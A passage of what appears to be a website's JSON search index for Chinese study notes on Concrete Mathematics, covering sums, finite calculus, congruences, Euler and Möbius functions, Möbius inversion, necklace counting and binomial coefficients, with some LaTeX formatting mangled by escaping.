- 2(2^n - 1) \\\\         &amp;= (n-1)2^{n+1}+2 \\\\ \\end{align*} \\]","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#math-in-list","title":"math in list","text":"<pre><code>- list $$ z_n = \\alpha a_n + \\beta b_n + z_{n-1} $$\n- list\n    $$ z_n = \\alpha a_n + \\beta b_n + z_{n-1} $$\n</code></pre> <ul> <li>list $$ z_n = \\alpha a_n + \\beta b_n + z_{n-1} $$</li> <li>list     $$ z_n = \\alpha a_n + \\beta b_n + z_{n-1} $$</li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u548c\u5f0f","title":"\u548c\u5f0f","text":"<ul> <li> <p>\u5c06\u4e00\u91cd\u548c\u5f0f\u53d8\u4e3a\u4e8c\u91cd\u548c\u5f0f\u7684\u4f8b\u5b50   $$   \\begin{align}       \\sum_{k=1}^{n} k2^k &amp;= \\sum_{1\\le j\\le k \\le n} 2^k \\           &amp;= \\sum_{1\\le j\\le n} \\sum_{j \\le k \\le n} 2^k  &amp;&amp; \\text{//\u8003\u8651j, k \u8303\u56f4\u6784\u6210\u7684\u4e09\u89d2\u5f62}\\           &amp;= \\sum_{1\\le j\\le n} 2^j(2^{n-j+1} - 1) \\           &amp;= \\sum_{1\\le j\\le n} 2^{n+1} - 2^j \\           &amp;= n2^{n+1} - 2(2^n - 1) \\           &amp;= (n-1)2^{n+1}+2 \\   \\end{align}   $$     p39   $$   \\begin{aligned}   S_{n} &amp;=\\sum_{1 \\leqslant k \\leqslant n} k^{2}=\\sum_{1 \\leqslant j \\leqslant k \\leqslant n} k \\   &amp;=\\sum_{1 \\leqslant j \\leqslant n} \\sum_{j \\leqslant k \\leqslant n} k \\   &amp;=\\sum_{1 \\leqslant j \\leqslant n}\\left(\\frac{j+n}{2}\\right)(n-j+1) \\   &amp;=\\frac{1}{2} \\sum_{1 \\leqslant j \\leqslant n}\\left(n(n+1)+j-j^{2}\\right) \\   &amp;=\\frac{1}{2} n^{2}(n+1)+\\frac{1}{4} n(n+1)-\\frac{1}{2} S_{n}=\\frac{1}{2} n\\left(n+\\frac{1}{2}\\right)(n+1)-\\frac{1}{2} S_{n}   \\end{aligned}   $$</p> </li> <li> <p>p33   $$   S_{n}=\\sum_{1 \\leqslant j&lt;k \\leqslant n} \\frac{1}{k-j}   $$   \u65e0\u8bba\u662f\u5148\u5bf9j\u6c42\u548c\uff0c\u8fd8\u662f\u5148\u5bf9k\u6c42\u548c\uff0c\u6700\u7ec8\u90fd\u53ea\u80fd\u5bfc\u51fa\\(S_n = \\sum_{1\\le j&lt;n} H_j\\)</p> </li> </ul> <p>\u5148\u7528k\u66ff\u6362k-j\uff0c\u7136\u540e\u5bf9j\u5148\u6c42\u548c\u53ef\u4ee5\u5bfc\u51fa\\(S_n = nH_n - n\\)</p> <ul> <li>aa</li> <li>a     $$     \\sum_{\\substack{j \\in J \\ k \\in K}} a_{j} b_{k}=\\left(\\sum_{j \\in J} a_{j}\\right)\\left(\\sum_{k \\in K} b_{k}\\right)     $$</li> <li>b     $$     S \\nabla=\\sum_{1 \\leqslant j \\leqslant k \\leqslant n} a_{j} a_{k}=\\frac{1}{2}\\left(\\left(\\sum_{k=1}^{n} a_{k}\\right)^{2}+\\sum_{k=1}^{n} a_{k}^{2}\\right)     $$</li> <li>c     $$     \\left(\\sum_{k=1}^{n} a_{k}\\right)\\left(\\sum_{k=1}^{n} b_{k}\\right)=n \\sum_{k=1}^{n} a_{k} b_{k}-\\sum_{1 \\leqslant j&lt;k \\leqslant n}\\left(a_{k}-a_{j}\\right)\\left(b_{k}-b_{j}\\right)     $$</li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5dee\u5206","title":"\u5dee\u5206","text":"<ul> <li>\u5fae\u5206 vs \u5dee\u5206   $$   Df(x) = \\lim_{h\\rightarrow0}{f(x+h) - f(x) \\over h}   $$</li> </ul> <p>$$   \\Delta f(x) = f(x+1) - f(x)   $$</p> <ul> <li> <p>\u6709\u9650\u5b9a\u79ef\u5206\u542b\u4e49   $$   \\sum_a^b f(x)\\delta x = \\sum_{a\\le x&lt;b}f(x) = g(x)|_a^b   $$   \u5176\u4e2d   $$   \\Delta g(x) =  f(x)   $$</p> </li> <li> <p>\u4e0b\u964d\u5e42\u7684\u63a8\u5e7f   $$   \\begin{array}\\   x^2 &amp;= x(x-1) \\   x^1 &amp;= x \\   x^0 &amp;= 1 \\   x^{-1} &amp;= {1 \\over x+1} \\   x^{-2} &amp;= \\frac{1}{(x+1)(x+2)}   \\end{array}   $$   \u6ee1\u8db3\u6307\u6570\u52a0\u6cd5   $$   x^{\\underline{m+n}}=x^{\\underline{m}}(x-m)^{\\underline{n}}   $$</p> </li> <li> <p>\u51e0\u4e2a\u51fd\u6570\u79ef\u5206</p> </li> </ul> <p>\u4e0b\u964d\u5e42   $$   \\sum x^{\\underline{m}}\\delta x =  \\left{\\begin{array} \\     {x^{\\underline{m+1}} \\over m+1} &amp;m \\ne -1 \\     H(x) &amp;m=-1 \\     \\end{array}\\right.   $$   \u6307\u6570   $$   \\sum c^x\\delta x = {c^x \\over c-1}   $$</p> <ul> <li> <p>\u5206\u5e03\u79ef\u5206   $$   \\sum u\\Delta v = uv - \\sum E v \\Delta u   $$   \u5176\u4e2dE\u4e3a\u79fb\u4f4d\u7b97\u5b50\uff0c\\(Ef(x) = f(x+1)\\)</p> </li> <li> <p>\u5206\u5e03\u79ef\u5206\u4f8b\u5b50   $$   \\begin{aligned}   \\sum x H_{x} \\delta x &amp;=\\frac{x^{2}}{2} H_{x}-\\sum \\frac{(x+1)^{\\underline{2}}}{2} x^{\\underline{-1}} \\delta x \\   &amp;=\\frac{x^{2}}{2} H_{x}-\\frac{1}{2} \\sum x \\delta x \\   &amp;=\\frac{x^{2}}{2} H_{x}-\\frac{x^{2}}{4}+C   \\end{aligned}   $$</p> </li> </ul> \\[ \\sum_{0 \\leq k&lt;n} k H_{k}=\\sum_{0}^{n} x H_{x} \\delta x=\\frac{n^{2}}{2}\\left(H_{n}-\\frac{1}{2}\\right) \\]","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5e95\u548c\u9876\u51fd\u6570\u6a21","title":"\u5e95\u548c\u9876\u51fd\u6570\u3001\u6a21","text":"<ul> <li>a   $$   n=\\left\\lfloor\\frac{n}{m}\\right\\rfloor+\\left\\lfloor\\frac{n+1}{m}\\right\\rfloor+\\cdots+\\left\\lfloor\\frac{n+m-1}{m}\\right\\rfloor   $$</li> </ul> <p>$$   \\lfloor m x\\rfloor=\\lfloor x\\rfloor+\\left\\lfloor x+\\frac{1}{m}\\right\\rfloor+\\cdots+\\left\\lfloor x+\\frac{m-1}{m}\\right\\rfloor   $$</p> <ul> <li>b   $$   \\sum_{0 \\leq k&lt;m}\\left\\lfloor\\frac{n k+x}{m}\\right\\rfloor=d\\left\\lfloor\\frac{x}{d}\\right\\rfloor+\\frac{m-1}{2} n+\\frac{d-m}{2}   $$</li> </ul> <p>\u8bc1\u660e\uff1a   $$   \\sum_{0 \\leq k&lt;m} \\left\\lfloor\\frac{n k}{m}\\right\\rfloor + \\sum_{0 \\leq k&lt;m} \\left\\lfloor\\frac{r_k + x}{m}\\right\\rfloor   $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u540c\u4f59","title":"\u540c\u4f59","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u540c\u4f59\u9664\u6cd5","title":"\u540c\u4f59\u9664\u6cd5","text":"<p>\u540c\u4f59\u662f\u4e00\u79cd\u7b49\u4ef7\u5173\u7cfb\uff08\u81ea\u53cd\u3001\u5bf9\u79f0\u3001\u4f20\u9012\uff09\u3002\u6ee1\u8db3\u52a0\u51cf\u4e58\uff0c\u5728\u67d0\u4e9b\u6761\u4ef6\u4e0b\u6ee1\u8db3\u540c\u4f59\u9664\u6cd5 $$ ad \\equiv bd (\\mod m) \\ \\Leftrightarrow a \\equiv b (\\mod m) \\ \u5176\u4e2d, (d, m)=1 $$ \u8bc1\u660e\u65f6\uff0c\u4e00\u79cd\u7b80\u5355\u7684\u65b9\u6cd5\u662f\u7b49\u53f7\u4e24\u8fb9\u540c\u65f6\u4e58\u4e0e\\(d'\\)\uff0c\u5373d\u7684\u9006\u5143\uff0c\\(dd'\\equiv1 (\\mod m)\\)</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406","title":"\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406","text":"<p>\u7279\u4f8b $$ \\left{\\begin{array}{l} x \\equiv b \\mod m \\ x \\equiv b \\mod n \\end{array}\\right. \\quad \\Leftrightarrow x \\equiv b \\mod mn \\</p> <p>\u5176\u4e2d(m, n)=1 $$ \u4e00\u822c\u60c5\u51b5\uff0c\u5bf9\u4e8e\u4ee5\u4e0b\u540c\u4f59\u65b9\u7a0b\uff0c\u53ef\u4ee5\u627e\u5230\u5176\u89e3\\(x \\equiv x_0 \\mod mn\\) $$ \\left{\\begin{array}{l} x \\equiv a \\mod m \\ x \\equiv b \\mod n \\end{array}\\right. \\quad \u5176\u4e2d(m, n)=1 $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5269\u4f59\u7cfb--\u72ec\u7acb\u5269\u4f59","title":"\u5269\u4f59\u7cfb &amp; \u72ec\u7acb\u5269\u4f59","text":"<p>\u5269\u4f59\u7cfb(residues number system)\uff1a $$ res(x) = (x \\bmod m_1, x \\bmod m_2, ..., x \\bmod m_r), \\quad (m_i, m_j) = 1, m=m_1\\cdot m_2 \\dots m_r $$ \u9006\u8fc7\u7a0b\uff0c\u77e5\u9053\u4e86x\u5728\u4e0d\u540c\u5206\u91cf\u4e0a\u7684\u4fe1\u606f\u540e\uff0c\u53ef\u4ee5\u786e\u5b9a\\(x \\bmod m\\)\u3002\uff08\u5982\u679c\u8fd8\u77e5\u9053x\u7684\u8303\u56f4\uff0c\u90a3\u4e48\u5c31\u80fd\u786e\u5b9ax\u7684\u503c\uff09</p> <p>\u5982\u4e8c\u7ef4\u60c5\u51b5\uff1a\u53ef\u4ee5\u5148\u6c42\u89e3\\((1, 0) = a, (0, 1)=b\\)\uff0c\u5219\\((x, y) = ax + by \\mod m\\)</p> <p>\u82e5\\(m_1 m_1' + m_2 m_2' = 1\\)\uff0c\u5219\\(a = m_2 m_2', b= m_1 m_1'\\)</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u4f7f\u7528","title":"\u4f7f\u7528","text":"<p>\\(x^2 \\equiv 1 \\mod m\\)\u6709\u591a\u5c11\u89e3\uff1f</p> <p>\u539f\u65b9\u7a0b\u7b49\u4ef7\u4e8e\u5bf9\u4efb\u610f\\(m_p &gt; 0\\) $$ x^2 \\equiv 1 \\mod p^{m_p} $$ \u56e0\u6b64\uff0c\u95ee\u9898\u8f6c\u5316\u4e3a\u5728m\u7684\u4e0d\u540c\u5206\u91cf\u4e0a\u8fdb\u884c\u6c42\u89e3x\uff0c\u6c42\u89e3\u5b8c\u540e\u4fbf\u53ef\u5f97\u5230x\u7684\u5269\u4f59\u7cfb\u3002</p> <p>\u800c\u5bf9\u4e8e\u8be5\u65b9\u7a0b\uff0c\u5f53p\u4e0d\u4e3a2\u65f6\uff0c\u4ec5\u6709\u4e24\u4e2a\u89e3\\(x = \\pm1\\)</p> <p>\u5f53p=2\u65f6\uff0c\u67094\u4e2a\u89e3\\(x = \\pm1, 1 \\pm p^{m_p - 1}\\)</p> <p>x\u5728\u4e0d\u540c\u5206\u91cf\u4e0a\u7684\u53ef\u80fd\u6027\u7684\u4e58\u79ef\u5373\u662f\u6240\u6709\u53ef\u80fd</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u4e00\u4e9b\u5b9a\u7406","title":"\u4e00\u4e9b\u5b9a\u7406","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u8d39\u9a6c\u5c0f\u5b9a\u7406","title":"\u8d39\u9a6c\u5c0f\u5b9a\u7406","text":"<p>\\(n^p \\equiv n \\mod p\\)\u6216\\(n^{p-1} \\equiv 1 \\mod p, p \\nmid n\\)</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5a01\u5c14\u900a\u5b9a\u7406","title":"\u5a01\u5c14\u900a\u5b9a\u7406","text":"<p>\\((p-1)! \\equiv -1 \\mod p\\)</p> <p>\u5173\u952e\u5728\u4e8e1, 2, ..., p-1\u7684\u6570\u4e2d</p> <ul> <li>\\(nn' \\equiv 1\\)\u603b\u5b58\u5728</li> <li>\\(x^2 \\equiv 1\\)\uff0c\u4ec5\u5f53x\u4e3a1, p-1\u65f6</li> </ul> <p>\u56e0\u6b642, ... p-2\u4e2d\u4e24\u4e24\u4e92\u9006\uff0c\u5269\u4f591\u548cp-1\u548c\u81ea\u5df1\u4e92\u9006</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#varphi\u51fd\u6570\u548cmu\u51fd\u6570","title":"\\(\\varphi\\)\u51fd\u6570\u548c\\(\\mu\\)\u51fd\u6570","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6b27\u62c9\u51fd\u6570","title":"\u6b27\u62c9\u51fd\u6570","text":"<p>\u6b27\u62c9\u51fd\u6570\\(\\varphi(n)\\)\uff1a1, 2, ... n-1\u4e2d\u548cn\u4e92\u7d20\u7684\u6570\u7684\u4e2a\u6570\u3002\u53e6\u5916\\(\\varphi(1) = 1\\)</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u79ef\u6027","title":"\u79ef\u6027","text":"<p>\u6b27\u62c9\u51fd\u6570\u662f\u79ef\u6027(multiplicative)\u7684\uff1a</p> <p>\\(\\varphi(mn) = \\varphi(m) \\varphi(n), \u5176\u4e2d(m,n)=1\\)</p> <p>\u539f\u56e0\uff1a\\((n, m) = 1 \\Leftrightarrow (n, m_1) = 1, (n, m_2) = 1\\)</p> <p>\u79ef\u6027\u4e00\u822c\u5b9a\u4e49\uff1a $$ \\begin{array}{l} f(1) &amp;= 1 \\ f(m_1 m_2) &amp;= f(m_1) f(m_2), m_1 \\perp m_2 \\end{array} $$ \u79ef\u6027\u5f15\u7406</p> <p>\\(g(m) = \\sum_{d|m} f(d)\\)\u662f\u79ef\u6027\u7684 \\(\\Leftrightarrow\\) \u90a3\u4e48f(m)\u4e5f\u662f\u79ef\u6027\u7684</p> <p>\u4ece\u53f3\u5f80\u5de6\u5f88\u5bb9\u6613\uff0c\u4ece\u5de6\u5f80\u53f3\u53ef\u4ee5\u4f7f\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\u3002\\(g(m_1m_2) = g(m_1)g(m_2)= \\sum_{d_1|m_1} \\sum_{d_2|m_2} f(d_1 d_2) = \\sum_{d_1|m_1} \\sum_{d_2|m_2} f(d_1)f(d_2) + f(m_1m_2) - f(m_1)f(m_2)\\)\uff08\u5176\u4e2d\u8ba8\u8bba\u4e86d1 = m_1, d2=m2\u7684\u60c5\u51b5\uff09</p> <p>\u5e94\u7528</p> <p>\u56e0\u4e3a\u6b27\u62c9\u51fd\u6570\u662f\u79ef\u6027\u7684\uff0c\u56e0\u6b64\u53ea\u9700\u8981\u8003\u8651\\(m=p^k\\)\u7684\u60c5\u51b5\uff08\u5bf9\u6240\u6709\u7684\u79ef\u6027\u51fd\u6570\u90fd\u662f\u8fd9\u4e2a\u5957\u8def\uff09</p> <p>\u6613\u5f97\\(\\varphi(p^k) = p^k - p^{k-1} = p^k(1-1/p)\\)</p> <p>\u6700\u540e\u5f97\uff1a\\(\\varphi(m)=m\\prod_{p} (1 - 1/p)\\)</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u83ab\u6bd4\u4e4c\u65af\u51fd\u6570","title":"\u83ab\u6bd4\u4e4c\u65af\u51fd\u6570","text":"<p>\\(\\mu(m)\\)\u7531\u4e0b\u5f0f\u786e\u5b9a\uff08\u5b9e\u8d28\u662f\u4e00\u4e2a\u9012\u5f52\u5f0f\uff0c\u540e\u4e00\u9879\u9700\u8981\u7531\u524d\u9762\u7684\u7b97\u51fa\uff09</p> <p>\\(\\sum_{d|m} \\mu(d) = [m=1]\\)</p> <p>\u7531\u524d\u9762\u7684\u79ef\u6027\u5f15\u7406\uff0c\u53ef\u77e5\u83ab\u6bd4\u4e4c\u65af\u51fd\u6570\u4e5f\u662f\u4e00\u4e2a\u79ef\u6027\u51fd\u6570\u3002\u6545\u53ea\u9700\u8981\u8003\u8651\u7d20\u6570\u60c5\u51b5</p> <p>\\(\\mu(p^k) = \\left\\{\\begin{array}. -1 \\quad k = 1\\\\ 0 \\quad k&gt; 1\\end{array}\\right.\\)</p> <p>\u6240\u4ee5 $$ \\mu(m) = \\left{\\begin{array}.     (-1)^r &amp; m = p_1p_2...p_r\\     0  &amp; \\exists m_p &gt; 1 \\end{array}\\right. $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u53cd\u6f14\u5b9a\u7406","title":"\u53cd\u6f14\u5b9a\u7406","text":"<p>\u53cd\u6f14\u5b9a\u7406(inversion principle) $$ g(m) = \\sum_{d|m} f(d) \\Leftrightarrow f(m) = \\sum_{d|m}\\mu(d)g(m/d) $$ \u8bc1\u660e $$ \\begin{align} \\sum_{d|m}\\mu(d)g(m/d) &amp;= \\sum_{d|m}g(d)\\mu(m/d)\\     &amp; = \\sum_{d|m}\\mu(m/d)\\sum_{k|d} f(k) \\     \u4ee4d = kl \\     &amp; = \\sum_{k|m}\\sum_{l | m/k} f(k)\\mu(m/kl) \\     &amp; = \\sum_{k|m}f(k)[m/k = 1] \\     &amp; = f(m) \\end{align} $$</p> <p>\u5e94\u7528</p> <p>\u6709\u6b27\u62c9\u51fd\u6570\u548c\\(\\sum_{d|m} \\varphi(d) = m, 1\\le d \\le m\\)</p> <p>\u8bf4\u660e\uff1a\u8003\u8651\u5199\u51fa1/m, 2/m, ... m/m\uff0c\u7684\u6240\u6709\u5206\u6570\uff0c\u7ecf\u8fc7\u5316\u7b80\u540e\uff0c\u4e0d\u540c\u5206\u6bcd\u7684\u5206\u6570\u4e2a\u6570\u548c\u6b63\u597d\u662fm\u3002</p> <p>\u56e0\u6b64\u7531\u53cd\u6f14\u5b9a\u7406\uff0c\u53ef\u5f97\u6b27\u62c9\u51fd\u6570\u7684\u53e6\u4e00\u79cd\u8868\u793a</p> <p>\\(\\varphi(m) = \\sum_{d|m}\\mu(d)m/d\\)\uff0c\u5176\u4e2d\u6709\u5927\u91cf0\u9879\u3002\u53ef\u4ee5\u4ec5\u8003\u8651\\(d | p_1p_2...p_r\\)\u7684\u60c5\u51b5\uff0c\u5171\u67092^r\u4e2a\u975e\u96f6\u9879\u3002\u5bf9\u5e94\\(m\\prod_{p|m} (1 - 1/p)\\)\u5c55\u5f00\u540e\u7684\u6bcf\u4e00\u9879\uff08\u521a\u597d2^r)\u9879\u3002</p> <p>\u66f4\u5f3a\u7684\u53cd\u6f14\u5b9a\u7406 $$ g(x)=\\sum_{d \\geqslant 1} f(x / d) \\Leftrightarrow f(x)=\\sum_{d \\geqslant 1} \\mu(d) g(x / d) . $$ \u8fd9\u4e2a\u53cd\u6f14\u6cd5\u5219\u5bf9\u6240\u6709\u6ee1\u8db3 \\(\\sum_{k, d \\geqslant}|f(x / k d)|&lt;\\infty\\) \u7684\u51fd\u6570 \\(f\\) \u90fd\u6210\u7acb</p> <p>\u8bc1\u660e\u53d8\u6362\u6709\u70b9\u5de7\u5999\uff0c\u5176\u4e2d\u7684m\u66ff\u6362\u6ca1\u770b\u61c2\u6709\u4ec0\u4e48\u597d\u7684\u8bc1\u660e\u65b9\u6cd5 $$ \\begin{aligned} \\sum_{d \\geqslant 1} \\mu(d) g(x / d) &amp;=\\sum_{d \\geqslant 1} \\mu(d) \\sum_{k \\geqslant 1} f(x / k d) \\ &amp;=\\sum_{m \\geqslant 1} f(x / m) \\sum_{d, k \\geqslant 1} \\mu(d)[m=k d] \\ &amp;=\\sum_{m \\geqslant 1} f(x / m) \\sum_{d \\backslash m} \\mu(d)=\\sum_{m \\geqslant 1} f(x / m)[m=1]=f(x) . \\end{aligned} $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#phi\u51fd\u6570","title":"\\(\\Phi\u51fd\u6570\\)","text":"<p>\\(\\Phi(x) = \\sum_{1\\le k\\le x}\\varphi(k)\\)\uff0c\u8868\u793a\u5206\u6bcd\u5c0f\u4e8ex\u7684\u6240\u6709\u6700\u7b80\u5206\u6570\u4e2a\u6570\u3002</p> <p>\u6709 $$ \\sum_{d\\ge1}\\Phi(x/d) = 1/2\\lfloor x \\rfloor \\lfloor x+1 \\rfloor $$ \u8bc1\u660e\uff1a\u8ba1\u6570</p> <p>\u5bf9\u5206\u5b50\u5206\u6bcd\u5c0f\u4e8ex\u7684\u6240\u6709\u5206\u6570\u8fdb\u884c\u8ba1\u6570\uff0c\u5373\\(S = \\{n/m| 1\\le n,m \\le \\lfloor x \\rfloor\\}\\)\uff0c\u6613\u77e5\\(\\# S = \u53f3\u5f0f\\)</p> <p>\u800cS\u4e2d\u7684\u5206\u6570\u53ef\u4ee5\u6309\u7167\\(gcd(m, n) = d\\)\u8fdb\u884c\u5206\u7c7b\uff0c\u5176\u4e2d\u6bcf\u4e00\u7c7b\u7684\u4e2a\u6570\u5373\u662f\\(\\Phi(x/d)\\)</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u73e0\u5b50\u9879\u94fe","title":"\u73e0\u5b50\u9879\u94fe","text":"<p>\u6709n\u79cd\u989c\u8272\u7684\u73e0\u5b50\uff0c\u5c06\u5176\u4e32\u6210\u957f\u5ea6m\u7684\u5706\u5f62\u9879\u94fe\uff0c\u6709\u591a\u5c11\u79cd\u65b9\u6cd5\u3002 $$ \\begin{aligned} m N(m, n) &amp;=\\sum_{a_{0}, \\cdots, a_{m-1} \\in S_{n}} \\sum_{0 \\leq k&lt;m}\\left[a_{0} \\cdots a_{m-1}=a_{k} \\cdots a_{m-1} a_{0} \\cdots a_{k-1}\\right] \\ &amp;=\\sum_{0 \\leq k&lt;m} \\sum_{a_{0}, \\cdots, a_{m-1} \\in S_{n}}\\left[a_{0} \\cdots a_{m-1}=a_{k} \\cdots a_{m-1} a_{0} \\cdots a_{k-1}\\right] \\</p> <p>&amp; = \\sum_{0\\le k &lt;m} n^{gcd(k, m)} \\end{aligned} $$ \u4e00\u6b65\u5de7\u5999\u7684\u53d8\u6362 $$ \\begin{aligned} N(m, n) &amp;=\\frac{1}{m} \\sum_{d \\backslash m} n^{d} \\sum_{0 \\leqslant k&lt;m}[d=\\operatorname{gcd}(k, m)] \\ \\end{aligned} $$ \u95ee\u9898\u53d8\u6210\u4e86\uff0c\\(0\\le k &lt; m\\)\u4e2d\u6709\u591a\u5c11\u4f7f\u5f97gcd(k, m)=d\u7684k\uff08\u5df2\u77e5d|m\uff09\u3002\u53ef\u77e5\u4e3a\\(\\varphi(m/d)\\)</p> <p>\u9ea6\u514b\u9a6c\u6d2a\u516c\u5f0f $$ N(m, n) = \\frac{1}{m} \\sum_{d \\backslash m} n^{d}\\varphi(m/d) $$ \u5176\u4e2d\u53ef\u5f97\uff0c\u8be5\u516c\u5f0f\u5e76\u4e0d\u660e\u663e\uff0c\u4e66\u4e0a\u4e5f\u7ed9\u51fa\u4e861\u9875\u534a\u7684\u8bc1\u660e\u3002 $$ \\sum_{d \\backslash m} \\varphi(d) n^{m / d} \\equiv 0(\\bmod m) $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u4e00\u4e9b\u53d8\u6362","title":"\u4e00\u4e9b\u53d8\u6362","text":"\\[ \\begin{aligned} \\sum_{0 \\leqslant k&lt;m} f(k) &amp;=\\sum_{d \\backslash m} \\sum_{0 \\leqslant k&lt;m} f(k)[d=\\operatorname{gcd}(k, m)] \\\\ &amp;=\\sum_{d \\backslash m} \\sum_{0 \\leqslant k&lt;m} f(k)[k / d \\perp m / d] \\\\ &amp;=\\sum_{d \\backslash m} \\sum_{0 \\leqslant k&lt;m / d} f(k d)[k \\perp m / d] \\\\ &amp;=\\sum_{d \\backslash m} \\sum_{0 \\leqslant k&lt;d} f(k m / d)[k \\perp d] \\end{aligned} \\]","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#5-\u4e8c\u9879\u5f0f\u7cfb\u6570","title":"5 \u4e8c\u9879\u5f0f\u7cfb\u6570","text":"<p>\u5b9a\u4e49 $$ {r \\choose k} = \\left{\\begin{array}\\     {r^{\\underline k} \\over k!} &amp;k\\ge0\\     0 &amp;k&lt;0\\end{array}\\right. $$ - r\u53ef\u4ee5\u4e3a\u5b9e\u6570</p> <ul> <li> <p>\\(r \\choose k\\)\u53ef\u4ee5\u770b\u4f5cr\u7684\u4e00\u4e2ak\u6b21\u591a\u9879\u5f0f</p> </li> <li> <p>\u4e00\u822c\u60c5\u51b5\u4f7f\u7528\u9636\u5c42\u6539\u5199   $$   {n \\choose k} = \\frac{n!}{k!(n-k)!}   $$</p> </li> </ul> <p>\u5bf9\u79f0\u6027 $$ {n \\choose k} = {n \\choose n-k} $$ \u5bf9\\(n \\le 0\\)\u4e0d\u6210\u7acb\uff0c\uff08\u8c8c\u4f3c\u5bf9n\u975e\u6574\u6570\u4e5f\u4e0d\u6210\u7acb\uff09</p> <p>\u7ec4\u5408\u89e3\u91ca</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5438\u6536absorption\u6052\u7b49\u5f0f","title":"\u5438\u6536(absorption)\u6052\u7b49\u5f0f","text":"<p>\u7ec4\u5408\u89e3\u91ca</p> <p>\u8bb0\u5fc6\uff1a\u5de6\u53f3\u5173\u4e8er\u9f50\u6b21 $$ k{r \\choose k} = r{r-1 \\choose k-1} $$ \u4f34\u968f\u6052\u7b49\u5f0f\uff08\u4fdd\u6301\u4e0b\u6307\u6807\u4e0d\u53d8\uff09 $$ (r-k){r \\choose k} = r{r-1 \\choose k} $$ \u4e0a\u5f0f\u53ef\u4ee5\u770b\u4f5c\u662fr\u7684k\u6b21\u591a\u9879\u5f0f\u7684\u6052\u7b49\u5f0f\uff0c\uff08\u63a8\u5bfc\u4e2dr\u5fc5\u987b\u662f\u6b63\u6574\u6570\uff0c\u4f46\u5b9e\u9645\u4e0a\u5bf9\u6240\u6709r\u90fd\u6210\u7acb\uff09\u4e66\u4e0a\u79f0\u4e3a\u591a\u9879\u5f0f\u63a8\u7406\u6cd5(polynomial 